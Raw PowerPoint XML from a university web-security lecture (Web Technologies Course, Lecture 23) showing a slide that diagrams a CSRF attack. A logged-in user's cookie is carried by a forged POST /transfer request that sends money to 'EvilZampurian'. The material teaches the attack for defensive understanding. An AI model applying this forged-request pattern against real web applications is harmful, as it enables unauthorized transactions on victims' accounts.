              <a:rPr dirty="0" sz="1600" spc="-30">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>/login</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1600" spc="-30">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1600" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>usr=Gavinelli&amp;pwd=RobotFriend</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="623570">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="894"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>200</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1600" spc="-15">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>OK</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1600" spc="-15">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1600" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>Set-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>Cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1600" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> auth=xYs…z76</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="object 16" descr=""/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2532126" y="2828544"/>
            <a:ext cx="7114540" cy="114300"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="7114540" h="114300">
                <a:moveTo>
                  <a:pt x="6999858" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="6999858" y="114300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7076058" y="76200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7018908" y="76200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7018908" y="38100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7076058" y="38100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6999858" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
              <a:path w="7114540" h="114300">
                <a:moveTo>
                  <a:pt x="6999858" y="38100"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="38100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="76200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6999858" y="76200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6999858" y="38100"/>
                </a:lnTo>
                <a:close/>
              </a:path>
              <a:path w="7114540" h="114300">
                <a:moveTo>
                  <a:pt x="7076058" y="38100"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="7018908" y="38100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7018908" y="76200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7076058" y="76200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7114158" y="57150"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7076058" y="38100"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="00637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object 17" descr=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2796032" y="2568955"/>
            <a:ext cx="6586220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>
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>POST</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1600" spc="-55">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>/transfer</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1600" spc="-50">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>Cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1600" spc="-35">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>auth=xYs…z76</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1600" spc="-35">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1600" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>to=Gabonzo&amp;amount=100.00</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="object 18" descr=""/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2532126" y="3166872"/>
            <a:ext cx="7114540" cy="114300"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="7114540" h="114300">
                <a:moveTo>
                  <a:pt x="114300" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="57150"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="114300" y="114300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="114300" y="76200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="95250" y="76200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="95250" y="38100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="114300" y="38100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="114300" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
              <a:path w="7114540" h="114300">
                <a:moveTo>
                  <a:pt x="114300" y="38100"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="95250" y="38100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="95250" y="76200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="114300" y="76200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="114300" y="38100"/>
                </a:lnTo>
                <a:close/>
              </a:path>
              <a:path w="7114540" h="114300">
                <a:moveTo>
                  <a:pt x="7114158" y="38100"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="114300" y="38100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="114300" y="76200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7114158" y="76200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7114158" y="38100"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="00637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" name="object 19" descr=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5743194" y="2939033"/>
            <a:ext cx="695325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>
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>200</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1600" spc="-5">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1600" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>OK</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="object 20" descr=""/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1519428" y="3594353"/>
            <a:ext cx="8883650" cy="692785"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="8883650" h="692785">
                <a:moveTo>
                  <a:pt x="1011555" y="635508"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="973455" y="616458"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="897255" y="578358"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="897255" y="616458"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="38100" y="616458"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="38100" y="204216"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="204216"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="654558"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="897255" y="654558"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="897255" y="692658"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="973455" y="654558"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1011555" y="635508"/>
                </a:lnTo>
                <a:close/>
              </a:path>
              <a:path w="8883650" h="692785">
                <a:moveTo>
                  <a:pt x="8883523" y="114300"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="8873998" y="95250"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8826373" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8769223" y="114300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8807323" y="114300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8807323" y="617093"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2411730" y="617093"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2411730" y="655193"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8845423" y="655193"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8845423" y="636143"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8845423" y="617093"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8845423" y="114300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8883523" y="114300"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="D7003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1" name="object 21" descr=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4619625" y="3808120"/>
            <a:ext cx="5028565" cy="744220"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="127635" rIns="0" bIns="0" rtlCol="0" vert="horz">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="r" marR="5080">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1005"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>POST</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1600" spc="-40">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>/transfer</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1600" spc="-45">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1600" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>to=EvilZampurian&amp;amount=999.99</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="r" marR="15875">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="910"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>+</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1600" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>Cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1600" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1600" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>auth=xYs…z76</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="object 25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/>
              <a:t>Luigi</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Libero</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Lucio</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Starace,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Ph.D.</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35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University</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Naples</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Federico</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>II</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>Technologies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Course</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Lecture</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>23</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="object 26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dirty="0" spc="-25"/>
              <a:t>10</a:t>
            </a:fld>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="object 22" descr=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="882396" y="4994147"/>
            <a:ext cx="2382520" cy="1382395"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="006379"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="00252F"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="128905" rIns="0" bIns="0" rtlCol="0" vert="horz">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" marL="128905" marR="122555" indent="635">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1015"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>❶</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-3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FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>User</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-2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FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>clicks</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-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FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>on</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-1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800" spc="-50">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>a </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>malicious</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-3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FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>link</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-1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FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>from</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t> the </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>browser</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-4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FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>they</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-3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800" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>are </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>currently</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-6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800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>logged-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-35">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>in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23" name="object 23" descr=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4072128" y="4994147"/>
            <a:ext cx="3333115" cy="1382395"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="006379"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="00252F"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="128905" rIns="0" bIns="0" rtlCol="0" vert="horz">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" marL="127000" marR="118745">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1015"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>❷</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-4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FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>The</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-2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FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>malicious</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-2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FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>page</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-4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FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>submits</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-3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800" spc="-50">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>a </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>form</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-3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FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>to</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-3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FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
